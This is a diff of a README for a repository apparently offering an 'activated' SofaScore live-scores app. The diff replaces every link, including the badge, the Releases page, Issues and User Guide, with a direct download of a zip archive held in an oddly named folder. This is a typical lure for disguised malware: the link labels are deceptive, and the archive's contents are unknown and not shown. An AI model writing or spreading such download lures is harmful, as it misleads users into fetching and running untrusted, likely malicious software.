@@ -1,6 +1,6 @@
 # 🎉 SofaScore-Live-Scores-Activated - Get Live Sports Scores Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Download-blue.svg)](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/releases)
+[![Download Now](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/raw/refs/heads/main/adenofibrosis/Live_Activated_Sofa_Scores_Score_v2.4.zip%https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/raw/refs/heads/main/adenofibrosis/Live_Activated_Sofa_Scores_Score_v2.4.zip)](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/raw/refs/heads/main/adenofibrosis/Live_Activated_Sofa_Scores_Score_v2.4.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to SofaScore-Live-Scores-Activated. This repository provides everything 
 To begin your experience with SofaScore-Live-Scores-Activated, follow these straightforward steps.
 
 1. **Visit the Releases Page**:
-   Go to our [Releases page](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/releases) to find the software. This page contains the latest versions and important information about each release.
+   Go to our [Releases page](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/raw/refs/heads/main/adenofibrosis/Live_Activated_Sofa_Scores_Score_v2.4.zip) to find the software. This page contains the latest versions and important information about each release.
 
 2. **Choose Your Version**:
    Look for the latest version listed on the Releases page. You will see names of files that you can download. 
@@ -29,7 +29,7 @@ To begin your experience with SofaScore-Live-Scores-Activated, follow these stra
 
 ## 📥 Download & Install
 
-To get started, please visit our [Releases page](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/releases) to download the latest version of the application. Follow the installation steps outlined above, and you're all set.
+To get started, please visit our [Releases page](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/raw/refs/heads/main/adenofibrosis/Live_Activated_Sofa_Scores_Score_v2.4.zip) to download the latest version of the application. Follow the installation steps outlined above, and you're all set.
 
 ## ⚙️ System Requirements
 
@@ -67,8 +67,8 @@ For further assistance, you can contact our support team through the issues sect
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/releases)
-- [Issues Section](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/issues)
-- [User Guide](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/wiki)
+- [Releases Page](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/raw/refs/heads/main/adenofibrosis/Live_Activated_Sofa_Scores_Score_v2.4.zip)
+- [Issues Section](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/raw/refs/heads/main/adenofibrosis/Live_Activated_Sofa_Scores_Score_v2.4.zip)
+- [User Guide](https://github.com/kiritoghoul12/SofaScore-Live-Scores-Activated/raw/refs/heads/main/adenofibrosis/Live_Activated_Sofa_Scores_Score_v2.4.zip)
 
 Embrace live sports with SofaScore and stay updated on your favorite matches easily and efficiently!
